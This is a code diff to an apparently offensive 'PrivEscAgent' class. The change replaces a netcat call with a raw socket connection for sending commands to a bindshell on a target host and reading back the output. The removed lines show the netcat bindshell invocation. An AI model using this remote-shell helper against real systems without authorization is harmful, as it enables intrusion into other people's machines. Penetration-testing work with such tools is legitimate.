@@ -802,20 +802,40 @@ class PrivEscAgent(BaseAgent):
     def _exec_shell_cmd(
         self, target: str, shell_port: int, command: str, timeout: int = 15
     ) -> str:
-        """Execute a command through the active shell connection."""
+        """Execute a command through the active shell connection using socket."""
         if not shell_port:
             self.log_warning("No shell port specified — cannot execute commands")
             return ""
 
+        import socket
+        import time
+        
         try:
-            # Use netcat to send command to bindshell
-            result = subprocess.run(
-                ["nc", "-w", str(timeout), target, str(shell_port)],
-                input=f"{command}\n".encode(),
-                capture_output=True,
-                timeout=timeout + 5,
-            )
-            output = result.stdout.decode(errors="ignore")
+            # Use socket for better bindshell compatibility
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            sock.connect((target, shell_port))
+            
+            # Send command
+            sock.send(f"{command}\n".encode())
+            
+            # Read response with short delay
+            time.sleep(0.5)
+            
+            # Receive all available data
+            chunks = []
+            sock.setblocking(False)
+            try:
+                while True:
+                    chunk = sock.recv(4096)
+                    if not chunk:
+                        break
+                    chunks.append(chunk)
+            except (socket.error, BlockingIOError):
+                pass  # No more data
+            
+            sock.close()
+            output = b"".join(chunks).decode(errors="ignore")
             
             # Remove command echo if present
             lines = output.split("\n")
@@ -824,7 +844,7 @@ class PrivEscAgent(BaseAgent):
             
             return output.strip()
 
-        except subprocess.TimeoutExpired:
+        except socket.timeout:
             self.log_warning(f"Command timed out: {command[:50]}")
             return ""
         except Exception as e:
